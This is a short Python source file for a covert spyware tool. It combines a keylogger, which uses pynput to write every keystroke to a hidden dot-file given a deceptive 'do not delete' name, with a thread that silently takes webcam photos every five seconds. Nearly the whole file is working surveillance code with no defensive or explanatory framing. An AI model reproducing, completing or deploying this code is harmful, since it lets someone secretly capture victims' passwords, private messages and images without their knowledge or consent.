# Dependencies: PYTHON3-PYNPUT



# Create two threads, one for listening to keyboard strokes and one for taking pictures
import threading 

# Date and Time module
import datetime

# Webcam Accessor
import pygame
import pygame.camera

# Keyboard listener
from pynput.keyboard import Listener

# Wait function
import time


# Store keystrokes in \keylog.txt
keys_info = "important_files_do_not_delete_pls_ty.txt"
file_path = r""

# Make file hidden
extend = "."

# Picture taking mechanism 
# Find webcams

pygame.camera.init()
camlist = pygame.camera.list_cameras()

# check if webcam exists

def webcam_pic():
    while(True):
        time.sleep(5)
        if camlist:
            print("success")
            # Store the current date and time 
            dtime = datetime.datetime.now()
            dtime_string = dtime.strftime('%Y-%m-%d_%H:%M:%S')+".jpg"
            cam = pygame.camera.Camera(camlist[0], (640, 480)) 
            cam.start()
            image = cam.get_image()
            pygame.image.save(image,dtime_string)
            cam.stop()

webcampic = threading.Thread(target=webcam_pic)
webcampic.start()

# Keylogging mechanism

keys_log = []

def on_press(key):
    global keys_log
    keys_log.append(key)

    write_file(keys_log)
    keys_log = []

def write_file(keys):
    key_actions = {
        "Key.space": " ",
        "Key.enter": " <key_pressed_user_enter>\n",
        "Key.backspace": "<",
        "Key.caps_lock": "<key_pressed_user_capsLock>",
        "Key.crtl": " <key_pressed_user_crtl>",
        "Key.alt": " <key_pressed_user_alt>",
        #macos
        #we don't really need anything else 
        "Key.cmd": " <key_pressed_user_cmd",
    }
    
    with open(file_path + extend + "important_files_do_not_delete_pls_ty.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            f.write(key_actions.get(k, k if "Key" not in k else ""))

with Listener(on_press=on_press, on_release=None) as listener:
    listener.join()


# Defining threads
# note: keylogging already has a thread generated automatically
# starting the camera thread
   